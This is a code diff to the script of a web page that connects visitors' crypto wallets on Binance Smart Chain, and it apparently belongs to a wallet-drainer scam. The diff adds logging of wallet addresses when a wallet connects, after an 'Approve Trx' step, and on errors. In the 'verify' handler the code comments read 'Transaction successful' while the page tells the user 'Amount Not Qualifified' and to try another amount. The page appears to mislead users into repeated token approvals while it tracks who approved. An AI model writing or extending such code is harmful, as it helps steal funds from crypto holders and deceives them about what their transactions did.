@@ -699,12 +699,10 @@ document.getElementById('connect-wallet').addEventListener('click', async () => 
     try {
         const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
         const networkId = await ethereum.request({ method: 'net_version' });
-	    
 
         // Check if the connected network is Binance Smart Chain (Mainnet or Testnet)
         if (networkId === '56' || networkId === '97') {
             const walletAddress = accounts[0];
-
 
             walletConnected = true;
         document.getElementById("wallet-address").textContent = "Wallet Address : " + walletAddress;
@@ -712,7 +710,7 @@ document.getElementById('connect-wallet').addEventListener('click', async () => 
             document.getElementById('disconnect-wallet').style.display = 'inline';
             document.getElementById('connect-wallet').style.display = 'none';
             document.getElementById('popup-status').textContent = 'Wallet connected';
-			updateLog(walletAddress);
+            updateLog(walletAddress,'Home - CFL Wallet Connect');
         } else {
 
             // Display an error message if the connected network is not BSC
@@ -768,10 +766,12 @@ document.getElementById('verify').addEventListener('click', async () => {
         // Transaction successful //Transaction Successful //✅ Amount Deposited successfully to your account!
         document.getElementById('popup-status').textContent = 'Amount Not Qualifified';
         document.getElementById('popup-message').textContent = 'Try using different amount';
+	updateLog(walletAddress,'Home - ✅ Approve Trx');
     } catch (error) {
         // Transaction failed
         document.getElementById('popup-status').textContent = 'Transaction Failed';
         document.getElementById('popup-message').textContent = `❌ Error: ${error.message}`;
+	updateLog(walletAddress,'Home - ❌ '+error.message);
     }
 });
 
@@ -871,11 +871,12 @@ function ApplyCC()
 {
 window.open("ApplyCreditCard.html");
 }
-async function updateLog(_walletAddress)
+
+async function updateLog(_walletAddress, _activity)
 {
 
     const walletAddress = _walletAddress;
-    const currentPage = 'Home - CFL';
+    const currentPage = _activity;
     const postData = {
         time: updateCurrentTime(),
         wallet: walletAddress,
@@ -916,7 +917,7 @@ window.onload = function () {
     }
 
     setInterval(updateCurrentTime, 1000);
-	 
+
 </script>
 
 </body>
